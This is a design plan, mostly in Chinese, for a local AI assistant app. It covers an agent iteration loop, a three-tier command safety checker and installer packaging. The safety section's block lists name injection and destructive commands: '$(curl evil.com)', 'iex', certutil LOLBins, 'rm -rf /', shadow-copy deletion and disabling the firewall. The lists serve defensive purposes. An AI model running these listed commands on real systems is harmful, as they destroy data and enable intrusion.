# Design Plan: Agent Iteration Loop + Security Overhaul + Cross-Platform Packaging

> 状态: **DRAFT** — 待审核评估  
> 日期: 2026-05-09  
> 关联 ROADMAP: Tier 8.1 (Packaging), 新增功能 (Agent Loop, Security UX)

---

## 一、背景与动机

当前 AI 助手存在三个核心体验短板：

### 1. 单轮执行（无自主迭代能力）

当前流程：用户发消息 → AI 回复（可选含 `[TASK_PLAN]`）→ 用户确认 → 计划执行 → **结束**。

AI 无法观察执行结果并自主决定是否需要继续工作。这是与 Claude Code 等工具最核心的体验差距。例如，用户说"创建一个项目脚手架"，AI 需要分多步执行（创建目录 → 写 README → 初始化 git），但当前只能执行一轮就结束。

### 2. 路径白名单是硬墙，不是护栏

当前行为：一旦 AI 触碰白名单外路径（如 `/opt/homebrew`）或系统路径（如 `/usr/bin`），立即 `Blocked` 终止，没有给用户选择的机会。

用户应该在弹窗中选择"允许本次"/"永久允许"/"拒绝"，而不是撞上一堵硬墙。

### 3. 无开箱即用的安装包

用户必须从源码编译（CMake、Qt6、ONNX Runtime、Poppler 等依赖链极长）。ROADMAP Tier 8.1 规划了 NSIS/AppImage/代码签名，但尚未实施。

---

## 二、实现顺序与依赖

```
Feature 2 (三级安全架构)     ← 基础：Agent Loop 需要能区分"硬拦截"和"需确认"
         ↓
Feature 1 (Agent 迭代循环)   ← 核心功能
         ↓
Feature 3 (跨平台安装包)     ← 独立，可与前两者并行
```

---

## 三、Feature 2: SafetyChecker 三级安全架构

### 3.1 架构总览

```
Tier 1: Blocked（永久拦截，无确认入口）
  ├── 命令注入检测（eval, iex, cmd /c, backticks, $() 等）
  └── 高危破坏性命令（sudo, rm -rf /, format, diskpart 等）

Tier 2: NeedsConfirmation（用户可选择：允许本次 / 永久允许 / 拒绝）
  ├── 系统路径访问（区分只读/写入警告强度）
  ├── 白名单外路径访问
  └── 破坏性操作（DeleteFile, rm, git push --force, curl/wget 等）

Tier 3: Approved（自动放行）
  ├── 白名单内路径的日常操作
  └── 已被"永久允许"的路径
```

### 3.2 Tier 1: 永久拦截（不可绕过）

这些是安全红线，**永远不会有确认弹窗**，直接返回 `Blocked`：

**命令注入**（现有逻辑，保持不变）:

| 类别 | 检测模式 | 示例 |
|------|---------|------|
| Shell 反引号 | `` `cmd` `` | `` `whoami` `` |
| Shell $() | `$(cmd)` | `$(curl evil.com)` |
| Shell eval/exec/source | `eval`, `exec`, `source /` | `eval $USER_INPUT` |
| PowerShell 动态执行 | `Invoke-Expression`, `iex` | `iex (New-Object ...)` |
| PowerShell 远程调用 | `Invoke-Command`, `icm` | `Invoke-Command -ScriptBlock {...}` |
| PowerShell 编码命令 | `-EncodedCommand` | base64 混淆绕过 |
| CMD 子 shell | `cmd /c`, `cmd /k` | `cmd /c del /f ...` |
| COMSPEC 间接调用 | `%COMSPEC%` | 环境变量间接拉起 |
| LOLBins 滥用 | `certutil -urlcache`, `mshta`, `cscript`, `wscript`, `rundll32`, `regsvr32` | 系统工具滥用 |

**高危破坏性命令**（现有逻辑，保持不变）:

| 类别 | Unix | Windows |
|------|------|---------|
| 提权 | `sudo`, `su -`, `doas`, `pkexec` | `runas`, `psexec`, `Start-Process -Verb RunAs` |
| 磁盘破坏 | `rm -rf /`, `rm -rf ~`, `mkfs.*`, `dd if=`, `fdisk`, `> /dev/sd*` | `format X:`, `diskpart`, `> \\.\PhysicalDrive` |
| 权限篡改 | `chmod 777 /路径`, `chown -R /` | `icacls /deny`, `takeown /f X:\` |
| 注册表破坏 | — | `reg delete HKLM`, `Remove-Item HKLM:` |
| 服务操作 | — | `sc delete`, `sc stop` |
| 杀关键进程 | — | `taskkill /f /im lsass/winlogon/csrss/services/svchost/explorer` |
| 系统破坏 | — | `shutdown /s /t 0`, `bcdedit /delete`, `vssadmin delete shadows` |
| 防火墙 | — | `netsh advfirewall set allprofiles state off` |

### 3.3 Tier 2: 需用户确认（可放行）

这些原本是 `Blocked`，改为 `NeedsConfirmation`，弹出确认框供用户决策：

**系统路径访问**（从 Blocked → NeedsConfirmation）:
- Unix: `/etc`, `/bin`, `/sbin`, `/usr/bin`, `/usr/lib`, `/boot`, `/root`, `/proc`, `/sys`, `/dev`
- macOS: `/System`, `/Library`, `/private/etc`, `/private/var`
- Windows: `C:\Windows`, `C:\Windows\System32`, `C:\Program Files` 等

**区分只读/写入警告强度**:
- 只读操作（`ls`, `cat`, `head`, `tail`, `which`, `du`, `df`, `pwd`, `file`, `stat`, `find` 无 `-delete`, `grep`, `wc`）→ **弱警告**（黄色图标）
- 写入/删除操作（`rm`, `mv`, `touch`, `echo >`, `mkdir`, 编辑器写入等）→ **强警告**（红色图标，"这是受保护的系统目录"）

**白名单外路径访问**（从 Blocked → NeedsConfirmation）:
- `/opt/homebrew`, `/projects`, 自定义工作区等不再一刀切拦截
- 弹窗提供三选项：**允许本次 / 永久加入白名单 / 拒绝**

**其他需确认操作**（现有行为，保持不变）:
- `DeleteFile` 原生文件删除
- `rm` 普通删除命令（非递归强制删除根的）
- `git push --force` 强制推送
- `curl` / `wget` 网络下载
- Windows `del /f`, `Remove-Item -Recurse`

### 3.4 Tier 3: 自动放行

- 白名单内路径的常规读写、编译、构建、调试操作
- 非注入、非高危的普通终端命令
- 项目内日常开发行为
- 一旦某路径被用户选择"永久允许"，后续对该路径的访问自动放行

### 3.5 修改清单

#### `src/tasks/safetychecker.h`

```cpp
// 新增结构体
struct PathViolation {
    QString path;
    enum Type { OutsideWhitelist, SystemPath };
    Type violationType;
    bool isWriteOp;  // 区分只读/写入，决定警告强度
};

// 新增公开方法
QVector<PathViolation> lastPathViolations() const;
void temporarilyAllowPath(const QString& path);    // 仅本次会话
void persistentlyAllowPath(const QString& path);   // 写入 QSettings
QStringList persistentlyAllowedPaths() const;
static bool isReadOnlyCommand(const QString& command);

// 新增私有成员
QVector<PathViolation> m_lastPathViolations;
QStringList m_temporaryAllowedPaths;
```

#### `src/tasks/safetychecker.cpp`

核心改动在 `validateOperation()`（约 line 144-213）：

- 命令注入检测 → `Blocked`（不变）
- 高危命令检测 → `Blocked`（不变）
- 系统路径 → 收集到 `m_lastPathViolations`，返回 `NeedsConfirmation`
- 白名单外路径 → 收集到 `m_lastPathViolations`，返回 `NeedsConfirmation`
- DeleteFile / rm / git push --force / curl / wget / del /f → `NeedsConfirmation`（不变）
- 其余 → `Approved`

新增 `isReadOnlyCommand()`:
```cpp
// 返回 true 的命令: ls, cat, head, tail, less, which, where, du, df,
//   pwd, file, stat, find(无-delete/-exec), grep, wc
// 返回 false 的命令: rm, mv, touch, mkdir, echo >, cp, chmod, chown 等
```

`isPathSafe()` 增加对 `m_temporaryAllowedPaths` 和 `persistentlyAllowedPaths()` 的检查。

构造函数中从 QSettings 加载已持久化的路径，与默认白名单合并。

#### `src/ui/operationconfirmdialog.h/cpp`

- 新增 `setPathViolations(const QVector<SafetyChecker::PathViolation>&)`
- 在 `setupUI()` 中有条件显示"路径访问警告"区域，每条违规显示：
  - 路径文本（只读=黄色警告图标，写入=红色警告图标）
  - 系统路径写入操作：额外显示"这是受保护的系统目录"强提示
  - 三个按钮：`[允许本次]` `[永久允许]` `[拒绝]`
- 新增 `pathViolationResponses()` 返回 `QVector<int>` (0=Deny, 1=Allow Once, 2=Always Allow)
- 如果有任何路径被拒绝，`m_confirmed = false`

#### `src/ui/mainwindow.cpp` (handleTaskResponse)

在 `engine->validatePlan(plan)` 返回 `NeedsConfirmation` 后：
- 检查 `engine->safetyChecker().lastPathViolations()`
- 非空时传入对话框：`dialog.setPathViolations(violations)`
- 对话框确认后：对"永久允许"调用 `persistentlyAllowPath()`，对"允许本次"调用 `temporarilyAllowPath()`

#### `src/cli/cli_application.cpp` (extractAndHandleTaskPlan)

安全验证返回 `NeedsConfirmation` 且有路径违规时：
- 逐条显示违规路径及类型标签（`[系统路径 - 写入]` 或 `[白名单外]`）
- 提示: `a=全部允许本次, p=全部永久允许, d=全部拒绝, 输入序号单独切换`

#### `tests/test_safetychecker.cpp`

新增测试用例：
- `isReadOnlyCommand()` — ls/cat/which/find 返回 true，rm/touch/echo-redirect 返回 false
- 路径违规返回 `NeedsConfirmation` 而非 `Blocked`
- 命令注入仍然返回 `Blocked`（eval, iex, cmd /c 等）
- 高危命令仍然返回 `Blocked`（sudo, rm -rf / 等）
- `persistentlyAllowPath()` 通过 QSettings 持久化并恢复
- `temporarilyAllowPath()` 在新 SafetyChecker 实例中不保留
- 系统路径 + 只读操作 → violation.isWriteOp == false
- 系统路径 + 写入操作 → violation.isWriteOp == true

---

## 四、Feature 1: AI Agent 自动迭代循环

### 4.1 核心思路

AI 生成 TASK_PLAN → 执行 → 将结果反馈给 AI → AI 判断是否需要继续 → 生成新 TASK_PLAN 或声明 `[TASK_COMPLETE]` → 循环直到完成或用户终止。

**关键设计决策**: 新建 `AgentLoop` 类统一管理循环状态（GUI 和 CLI 共用），而非将循环逻辑塞入 MainWindow（已 1678 行，ROADMAP Tier 4.2 标记为待拆分）。

### 4.2 新增文件: `src/tasks/agentloop.h`

```cpp
class AgentLoop : public QObject {
    Q_OBJECT
public:
    enum State { Idle, Running, AwaitingUserConfirm, Completed, Stopped, MaxIterations };

    static AgentLoop* instance();

    void start(const QString& aiResponse, const QString& sessionId);
    void confirmPlan();   // 用户点击确认
    void cancelPlan();    // 用户拒绝或请求修改
    void stop();          // 用户点击停止按钮

    State state() const;
    int iterationCount() const;
    void setMaxIterations(int max);  // 默认 10

signals:
    // 执行完成，需要将结果反馈给 AI 继续对话
    void executionResultReady(const QString& feedbackMessage, const QString& sessionId);
    // 循环结束（完成/停止/超限/被拦截）
    void loopFinished(const QString& summary, const QString& sessionId);
    // 计划需要用户确认（涉及路径违规等）
    void planRequiresConfirmation(const OperationPlan& plan,
                                  const QVector<SafetyChecker::PathViolation>& violations);
    void stateChanged(State newState);

private:
    void processNextIteration(const QString& response);
    QString buildResultFeedback(const QVector<CommandResult>& results) const;
    bool isTaskComplete(const QString& response) const;
    void executeAndContinue(const OperationPlan& plan);

    State m_state = Idle;
    int m_iterationCount = 0;
    int m_maxIterations = 10;
    OperationPlan m_pendingPlan;
    QString m_sessionId;
    QString m_originalResponse;
};
```

### 4.3 新增文件: `src/tasks/agentloop.cpp`

**`start(aiResponse, sessionId)`**:
1. 从 AI 响应中解析 TASK_PLAN
2. 调用 SafetyChecker 验证
3. `Approved` → 直接自动执行 → 构建反馈消息 → emit `executionResultReady`
4. `NeedsConfirmation` → emit `planRequiresConfirmation` → 暂停等待用户
5. `Blocked` → emit `loopFinished` 附带拦截原因

**`confirmPlan()`**:
1. 用户确认 → 执行计划
2. 检查原始 AI 响应是否含 `[TASK_COMPLETE]` → 是则 emit `loopFinished`
3. 否则 `m_iterationCount++` → 构建反馈 → emit `executionResultReady`

**`executeAndContinue(plan)`**:
1. 通过 CommandExecutor 执行计划
2. 构建结构化反馈消息：

```
[ITERATION_FEEDBACK]
Previous iteration results:
  Operation 1: SUCCESS — created ~/myapp/src
  Operation 2: SUCCESS — wrote ~/myapp/README.md
  Total: 2/2 succeeded, 0 failed

Continue if more work is needed. Output [TASK_COMPLETE] when done.
```

**`isTaskComplete(response)`**: 检测 `[TASK_COMPLETE]` 或 `[TASK_FINISHED]` 标签（大小写不敏感）。

**`stop()`**: 取消 CommandExecutor，设状态为 `Stopped`，emit `loopFinished`。

### 4.4 修改: `src/prompts/en/task.md` 和 `src/prompts/zh_CN/task.md`

在 "Operating System Environment" 之后新增：

```markdown
## Iteration Loop

When you receive an `[ITERATION_FEEDBACK]` block containing previous execution results:

1. **Task complete** → output `[TASK_COMPLETE]` with a brief summary
2. **More steps needed** → output a new `[TASK_PLAN]` with the next operations
3. **Something failed** → analyze the error and adjust (fix paths, try alternatives)

Rules:
- Never repeat a failed operation without modifying it
- If the same command fails 3 times, stop and explain why
- After every plan execution, re-evaluate: is more work needed?
- If the original request was vague, confirm completion with the user before TASK_COMPLETE

## Tags Reference

- `[TASK_PLAN]...[/TASK_PLAN]` — issue a command plan
- `[TASK_COMPLETE]` — signal task completion
- `[ITERATION_FEEDBACK]` — previous execution results (injected by the app, not by you)
```

### 4.5 修改: `src/ui/mainwindow.cpp`

**`handleTaskResponse()`** 简化为委托给 AgentLoop:

```cpp
void MainWindow::handleTaskResponse(const QString& response) {
    // 连接 AgentLoop 信号到 MainWindow 槽（一次性连接）
    AgentLoop* loop = AgentLoop::instance();
    // ...信号连接...
    loop->start(response, m_requestSessionId);
}
```

**新增槽函数**:
- `onAgentLoopResultReady(feedbackMessage, sessionId)` — 将反馈注入为会话消息，调用 `m_networkManager->sendChatRequestWithContext()` 让 AI 继续思考
- `onAgentLoopPlanConfirm(plan, violations)` — 显示 OperationConfirmDialog（含路径违规信息），确认 → `loop->confirmPlan()`，取消 → `loop->cancelPlan()`
- `onAgentLoopFinished(summary, sessionId)` — 在聊天区追加完成摘要，恢复输入框

**`onSendClicked()` 改动**: 如果 `AgentLoop::state() == Running`，点击发送/停止按钮调用 `AgentLoop::stop()`

**`onStreamFinished()` 改动**: 检测到 `[TASK_PLAN]` 后调用 `handleTaskResponse()` 进入迭代循环

### 4.6 修改: `src/ui/mainwindow.h`

- 声明新槽函数
- 存储 AgentLoop 信号连接的 `QMetaObject::Connection` 成员（析构时断开）

### 4.7 修改: `src/cli/cli_application.cpp`

`extractAndHandleTaskPlan()` 同样委托给 AgentLoop：

- `planRequiresConfirmation` → 显示计划预览 + 询问 `/confirm` 或 `[Y/n]`
- `executionResultReady` → 将反馈作为新对话请求发送
- `loopFinished` → 显示摘要，返回输入提示符

### 4.8 修改: `CMakeLists.txt`

TaskModule 库增加 `src/tasks/agentloop.h` 和 `src/tasks/agentloop.cpp`。

### 4.9 新增测试: `tests/test_agentloop.cpp`

- 单次迭代 + TASK_COMPLETE
- 多次迭代（3 个计划）+ 最终 TASK_COMPLETE
- 最大迭代次数限制（设 2，验证第 3 次被截断）
- `isTaskComplete()` 解析（各种格式变体）
- 执行中途停止
- 路径违规暂停并恢复（依赖 Feature 2）

### 4.10 修改: `tests/CMakeLists.txt`

增加 `test_agentloop` 测试目标。

---

## 五、Feature 3: 跨平台安装包（ROADMAP 8.1）

### 5.1 新增: `scripts/package.sh`

从 `build.sh` 中提取打包逻辑，独立为专用脚本，同时扩展：

**`package_macos()`**:
- 现有 DMG 创建逻辑（`hdiutil`）
- **新增** 可选代码签名：设置 `CODE_SIGN_IDENTITY` 环境变量后，执行 `codesign --deep --force --verify --sign`
- **新增** 可选公证：`xcrun notarytool submit` + `xcrun stapler staple`

**`package_windows()`**:
- 默认 ZIP（现有逻辑）
- **新增** `--nsis` 标志：运行 `windeployqt` → 替换 `.nsi` 模板中的版本号 → 调用 `makensis`

**`package_linux()`**:
- 默认 tar.gz（现有逻辑）
- **新增** `--appimage` 标志：创建 AppDir（含 desktop 文件 + 图标）→ 运行 `linuxdeployqt` 或 `appimagetool`

用法: `./scripts/package.sh [--nsis|--appimage|--sign]`

### 5.2 新增: `resources/installer/installer.nsi.in`

NSIS 模板，含 `@PROJECT_VERSION@` 占位符。功能：
- 安装到 `$PROGRAMFILES64\LocalAIAssistant`
- 开始菜单快捷方式
- 桌面快捷方式
- 卸载程序
- `package.sh` 通过 `sed` 替换版本号后调用 `makensis`

### 5.3 修改: `scripts/build.sh`

`cmd_package()` 函数体替换为一行委托：
```bash
cmd_package() {
    bash "$PROJECT_ROOT/scripts/package.sh" "$@"
}
```

### 5.4 修改: `.github/workflows/build.yml`

在测试通过后增加打包和 artifact 上传步骤：

```yaml
- name: Package
  run: ./scripts/build.sh -d --no-run -p
- uses: actions/upload-artifact@v4
  with:
    name: LocalAIAssistant-${{ matrix.os }}
    path: release/*
```

---

## 六、总文件变更清单

| 操作 | 文件 | 所属功能 |
|------|------|---------|
| **NEW** | `src/tasks/agentloop.h` | Feature 1 |
| **NEW** | `src/tasks/agentloop.cpp` | Feature 1 |
| **NEW** | `tests/test_agentloop.cpp` | Feature 1 |
| **NEW** | `scripts/package.sh` | Feature 3 |
| **NEW** | `resources/installer/installer.nsi.in` | Feature 3 |
| EDIT | `src/tasks/safetychecker.h` | Feature 2 |
| EDIT | `src/tasks/safetychecker.cpp` | Feature 2 |
| EDIT | `src/ui/operationconfirmdialog.h` | Feature 2 |
| EDIT | `src/ui/operationconfirmdialog.cpp` | Feature 2 |
| EDIT | `src/ui/mainwindow.h` | Feature 1 + 2 |
| EDIT | `src/ui/mainwindow.cpp` | Feature 1 + 2 |
| EDIT | `src/cli/cli_application.cpp` | Feature 1 + 2 |
| EDIT | `src/prompts/en/task.md` | Feature 1 |
| EDIT | `src/prompts/zh_CN/task.md` | Feature 1 |
| EDIT | `CMakeLists.txt` | Feature 1 |
| EDIT | `tests/CMakeLists.txt` | Feature 1 |
| EDIT | `tests/test_safetychecker.cpp` | Feature 2 |
| EDIT | `scripts/build.sh` | Feature 3 |
| EDIT | `.github/workflows/build.yml` | Feature 3 |

---

## 七、验证方案

### Feature 2 (三级安全架构)
- `ctest -R safetychecker` — 所有现有 + 新增测试通过
- GUI: 让 AI "列出 /opt/homebrew 下的文件" → 弹窗显示路径警告 + Allow Once/Always/Deny
- GUI: 点击"永久允许" → 后续同路径操作自动放行
- GUI: 让 AI "执行 sudo ls" → 仍然 Blocked（安全红线）
- CLI: 同样的路径警告内联显示，输入 `a` 允许所有

### Feature 1 (Agent 迭代循环)
- `ctest -R agentloop` — 新测试通过
- `cmake --build build --parallel 4` — 干净构建
- GUI: "创建 ~/testproj，含 src、tests、docs 目录和 README" → AI 第一个计划创建目录，第二个计划写 README，自动声明 TASK_COMPLETE
- GUI: 执行中点"停止" → 循环优雅终止，已执行结果保留
- CLI: 同样的多步任务，`--yes` 自动确认 → 自主完成
- 验证最大迭代上限（设 limit=2，需要 5 步的任务在第 2 轮后终止）

### Feature 3 (安装包)
- CI 在三个平台均产生安装包 artifacts
- macOS: DMG 挂载，拖入 /Applications 后启动正常
- Windows: NSIS 安装程序执行 → 开始菜单快捷方式 → 卸载程序正常工作
- Linux: AppImage 无需安装依赖即可运行
